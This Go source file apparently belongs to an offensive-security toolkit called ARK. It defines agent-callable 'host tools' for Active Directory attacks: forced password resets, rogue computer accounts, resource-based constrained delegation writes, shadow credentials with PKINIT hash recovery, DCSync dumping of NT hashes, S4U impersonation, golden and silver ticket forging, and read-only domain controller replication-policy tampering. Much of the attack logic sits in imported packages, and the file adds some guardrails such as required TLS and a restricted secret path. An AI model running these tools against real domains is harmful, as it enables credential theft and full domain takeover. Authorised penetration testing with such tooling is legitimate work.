package agent

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/KKingZero/ARK/pkg/arkhome"
	"github.com/KKingZero/ARK/pkg/drs"
	"github.com/KKingZero/ARK/pkg/krb"
	"github.com/KKingZero/ARK/pkg/ldapcli"
	"github.com/KKingZero/ARK/pkg/preimplant"
	"github.com/KKingZero/ARK/pkg/smbcli"
)

func hostTool(name, desc, risk string) ToolDef {
	return ToolDef{
		Name:         name,
		Description:  desc,
		Risk:         risk,
		Host:         true,
		NeedsSession: false,
	}
}

func runHostTool(name string, args map[string]any) (string, error) {
	switch name {
	case "host_ldap_set":
		return hostLDAPSet(args)
	case "host_ad_password":
		return hostADPassword(args)
	case "host_ad_add_computer":
		return hostADAddComputer(args)
	case "host_rbcd_write":
		return hostRBCD(args, true)
	case "host_rbcd_clear":
		return hostRBCD(args, false)
	case "host_ad_shadow_auto":
		return hostShadowAuto(args)
	case "host_ad_shadow_clear":
		return hostShadowClear(args)
	case "host_ad_dcsync":
		return hostDCSync(args)
	case "host_kerberos_asktgt":
		return hostAskTGT(args)
	case "host_kerberos_s4u":
		return hostS4U(args)
	case "host_kerberos_pkinit":
		return hostPKINIT(args)
	case "host_kerberos_golden":
		return hostGolden(args, false)
	case "host_kerberos_silver":
		return hostGolden(args, true)
	case "host_ad_prp_clear_never_reveal":
		return hostPRPClear(args)
	case "host_ad_prp_add_reveal":
		return hostPRPAdd(args)
	default:
		return "", fmt.Errorf("unknown host tool %s", name)
	}
}

func hostLDAPOpts(args map[string]any) (ldapcli.Options, error) {
	o := ldapcli.DefaultOptions()
	o.Host = str(args, "dc")
	o.Domain = str(args, "domain")
	o.Username = str(args, "user")
	if o.Username == "" {
		o.Username = str(args, "username")
	}
	pass, err := hostSecret(args, "pass_file")
	if err != nil {
		return o, err
	}
	o.Password = pass
	o.Hash = str(args, "hash")
	if tid := str(args, "ticket_id"); tid != "" {
		_, p, err := krb.LoadTicket(tid, "")
		if err != nil {
			return o, err
		}
		o.CCache = p
	}
	if o.Host == "" {
		return o, fmt.Errorf("dc required")
	}
	return o, nil
}

func hostSecret(args map[string]any, fileKey string) (string, error) {
	p := str(args, fileKey)
	if p == "" {
		return "", nil
	}
	abs, err := jailSecretPath(p)
	if err != nil {
		return "", err
	}
	b, err := os.ReadFile(abs)
	if err != nil {
		return "", err
	}
	return strings.TrimRight(string(b), "\r\n"), nil
}

func hostLDAPSet(args map[string]any) (string, error) {
	opts, err := hostLDAPOpts(args)
	if err != nil {
		return "", err
	}
	opts.RequireTLS = true
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	target := str(args, "target")
	attr := str(args, "attr")
	value := str(args, "value")
	if target == "" || attr == "" {
		return "", fmt.Errorf("target and attr required")
	}
	if value == "" && !boolArg(args, "force") {
		return "", fmt.Errorf("empty value would clear %s on %s; pass force=true", attr, target)
	}
	base := ldapcli.BaseDN(opts.Domain)
	if err := ldapcli.SetAttr(conn, base, target, attr, value); err != nil {
		return "", err
	}
	return fmt.Sprintf("OK ldap set %s on %s", attr, target), nil
}

func hostADPassword(args map[string]any) (string, error) {
	opts, err := hostLDAPOpts(args)
	if err != nil {
		return "", err
	}
	target := str(args, "target")
	newPass, err := hostSecret(args, "new_pass_file")
	if err != nil {
		return "", err
	}
	if target == "" || newPass == "" {
		return "", fmt.Errorf("target and new_pass_file required")
	}
	force := boolArg(args, "force")
	if err := preimplant.ResetPassword(opts, target, newPass, force); err != nil {
		return "", err
	}
	return fmt.Sprintf("OK password reset for %s", target), nil
}

func hostADAddComputer(args map[string]any) (string, error) {
	opts, err := hostLDAPOpts(args)
	if err != nil {
		return "", err
	}
	name := str(args, "name")
	if name == "" {
		return "", fmt.Errorf("name required")
	}
	pass, err := hostSecret(args, "computer_pass_file")
	if err != nil {
		return "", err
	}
	out := str(args, "out")
	sam, machinePass, err := preimplant.AddComputer(opts, name, pass, out)
	if err != nil {
		return "", err
	}
	msg := fmt.Sprintf("OK computer %s", sam)
	if out != "" {
		msg += " pass-file " + out
	}
	_ = machinePass
	return msg, nil
}

func hostRBCD(args map[string]any, write bool) (string, error) {
	opts, err := hostLDAPOpts(args)
	if err != nil {
		return "", err
	}
	to := str(args, "to")
	from := str(args, "from")
	if to == "" {
		return "", fmt.Errorf("to required")
	}
	opts.RequireTLS = true
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	base := ldapcli.BaseDN(opts.Domain)
	if write {
		if from == "" {
			return "", fmt.Errorf("from required")
		}
		st, err := ldapcli.WriteRBCD(conn, base, to, from)
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("OK rbcd write --to %s --from %s", st.TargetSAM, from), nil
	}
	st, err := ldapcli.ClearRBCD(conn, base, to, from)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("OK rbcd clear --to %s", st.TargetSAM), nil
}

func hostShadowAuto(args map[string]any) (string, error) {
	opts, err := hostLDAPOpts(args)
	if err != nil {
		return "", err
	}
	target := str(args, "target")
	if target == "" {
		return "", fmt.Errorf("target required")
	}
	out := str(args, "out")
	if out == "" {
		out = target + ".pfx"
	}
	opts.RequireTLS = true
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	base := ldapcli.BaseDN(opts.Domain)
	cred, err := ldapcli.GenerateKeyCredential(target)
	if err != nil {
		return "", err
	}
	if err := ldapcli.WriteKeyCredentialPFX(out, cred.PFX); err != nil {
		return "", err
	}
	st, err := ldapcli.WriteShadow(conn, base, target, cred.Blob)
	if err != nil {
		return "", err
	}
	res, err := krb.PKINIT(krb.PKINITOptions{
		Domain: opts.Domain, Username: target, KDC: opts.Host, PFXPath: out,
	})
	if err != nil {
		return fmt.Sprintf("OK shadow auto %s pfx=%s (pkinit: %v)", st.TargetSAM, out, err), nil
	}
	return fmt.Sprintf("OK shadow auto %s pfx=%s NT %s", st.TargetSAM, out, res.NTHash), nil
}

func hostShadowClear(args map[string]any) (string, error) {
	opts, err := hostLDAPOpts(args)
	if err != nil {
		return "", err
	}
	target := str(args, "target")
	if target == "" {
		return "", fmt.Errorf("target required")
	}
	opts.RequireTLS = true
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	st, err := ldapcli.ClearShadow(conn, ldapcli.BaseDN(opts.Domain), target)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("OK shadow clear %s", st.TargetSAM), nil
}

func hostDCSync(args map[string]any) (string, error) {
	opts, err := hostLDAPOpts(args)
	if err != nil {
		return "", err
	}
	target := str(args, "target")
	if target == "" {
		return "", fmt.Errorf("target required")
	}
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return "", err
	}
	e, err := ldapcli.LookupSAM(conn, ldapcli.BaseDN(opts.Domain), target)
	conn.Close()
	if err != nil {
		return "", err
	}
	ticket := str(args, "ticket_id")
	if ticket == "" {
		if opts.Password == "" {
			return "", fmt.Errorf("dcsync needs pass_file (asktgt) or ticket_id")
		}
		m, err := krb.AskTGT(krb.AskTGTOptions{
			Domain: opts.Domain, Username: opts.Username, Password: opts.Password, KDC: opts.Host,
		})
		if err != nil {
			return "", err
		}
		ticket = m.CCache
	}
	s, err := smbcli.DialKerberos(smbcli.Options{Host: opts.Host, Domain: opts.Domain, Ticket: ticket})
	if err != nil {
		return "", err
	}
	defer s.Close()
	res, err := drs.ReplicateObject(s, e.DN)
	if err != nil {
		return "", err
	}
	res.SAM = e.GetAttributeValue("sAMAccountName")
	return fmt.Sprintf("OK dcsync sam=%s nt=%s", res.SAM, res.NTHash), nil
}

func hostAskTGT(args map[string]any) (string, error) {
	pass, err := hostSecret(args, "pass_file")
	if err != nil {
		return "", err
	}
	m, err := krb.AskTGT(krb.AskTGTOptions{
		Domain:   str(args, "domain"),
		Username: firstNonEmpty(str(args, "user"), str(args, "username")),
		Password: pass,
		Hash:     str(args, "hash"),
		KDC:      str(args, "dc"),
	})
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("ok asktgt id=%s principal=%s@%s ccache %s", m.ID, m.Principal, m.Realm, m.CCache), nil
}

func hostS4U(args map[string]any) (string, error) {
	pass, err := hostSecret(args, "pass_file")
	if err != nil {
		return "", err
	}
	m, err := krb.S4U(krb.S4UOptions{
		Domain:      str(args, "domain"),
		Username:    firstNonEmpty(str(args, "user"), str(args, "username")),
		Password:    pass,
		KDC:         str(args, "dc"),
		Impersonate: str(args, "impersonate"),
		SPN:         str(args, "spn"),
		AltService:  str(args, "altservice"),
	})
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("ok s4u id=%s principal=%s server=%s ccache %s", m.ID, m.Principal, m.Server, m.CCache), nil
}

func hostPKINIT(args map[string]any) (string, error) {
	res, err := krb.PKINIT(krb.PKINITOptions{
		Domain:   str(args, "domain"),
		Username: firstNonEmpty(str(args, "user"), str(args, "username")),
		KDC:      str(args, "dc"),
		PFXPath:  str(args, "pfx"),
		PFXPass:  str(args, "pfx_pass"),
	})
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("ok pkinit nt=%s id=%s ccache %s", res.NTHash, res.Ticket.ID, res.Ticket.CCache), nil
}

func hostGolden(args map[string]any, silver bool) (string, error) {
	aes, err := hostSecret(args, "aes_file")
	if err != nil {
		return "", err
	}
	opts := krb.ForgeOptions{
		Domain:    str(args, "domain"),
		User:      firstNonEmpty(str(args, "user"), str(args, "username")),
		SID:       str(args, "sid"),
		AESKeyHex: aes,
		SPN:       str(args, "spn"),
	}
	if silver && opts.SPN == "" {
		return "", fmt.Errorf("silver: spn required")
	}
	m, err := krb.ForgeTicket(opts)
	if err != nil {
		return "", err
	}
	kind := "golden"
	if silver {
		kind = "silver"
	}
	return fmt.Sprintf("ok %s id=%s principal=%s ccache %s", kind, m.ID, m.Principal, m.CCache), nil
}

func hostPRPClear(args map[string]any) (string, error) {
	opts, err := hostLDAPOpts(args)
	if err != nil {
		return "", err
	}
	opts.RequireTLS = true
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	dn, err := ldapcli.ClearNeverReveal(conn, ldapcli.BaseDN(opts.Domain), str(args, "rodc"))
	if err != nil {
		return "", err
	}
	return "OK prp clear-never-reveal " + dn, nil
}

func hostPRPAdd(args map[string]any) (string, error) {
	opts, err := hostLDAPOpts(args)
	if err != nil {
		return "", err
	}
	opts.RequireTLS = true
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	dn, err := ldapcli.AddRevealOnDemand(conn, ldapcli.BaseDN(opts.Domain), str(args, "rodc"), str(args, "group"))
	if err != nil {
		return "", err
	}
	return "OK prp add-reveal " + dn, nil
}

func boolArg(args map[string]any, k string) bool {
	if v, ok := args[k].(bool); ok {
		return v
	}
	s := str(args, k)
	return s == "1" || strings.EqualFold(s, "true")
}

func firstNonEmpty(vals ...string) string {
	for _, v := range vals {
		if v != "" {
			return v
		}
	}
	return ""
}

func hostApprovalDesc(name string, args map[string]any) string {
	keys := []string{"dc", "domain", "target", "to", "from", "rodc", "name", "group", "attr", "impersonate", "spn", "user", "username"}
	var parts []string
	for _, k := range keys {
		if v := str(args, k); v != "" {
			parts = append(parts, k+"="+v)
		}
	}
	if len(parts) == 0 {
		return name
	}
	return strings.Join(parts, " ")
}

func jailSecretPath(p string) (string, error) {
	if p == "" {
		return "", fmt.Errorf("path required")
	}
	if strings.Contains(p, "..") {
		return "", fmt.Errorf("secret path rejects ..")
	}
	abs, err := filepath.Abs(p)
	if err != nil {
		return "", err
	}
	cwd, _ := os.Getwd()
	allow := []string{arkhome.Dir()}
	if cwd != "" {
		allow = append(allow, cwd)
	}
	for _, root := range allow {
		r, err := filepath.Abs(root)
		if err != nil {
			continue
		}
		rel, err := filepath.Rel(r, abs)
		if err != nil {
			continue
		}
		if rel == "." || (rel != ".." && !strings.HasPrefix(rel, ".."+string(os.PathSeparator))) {
			return abs, nil
		}
	}
	return "", fmt.Errorf("secret path %s not under ~/.ark or cwd", p)
}
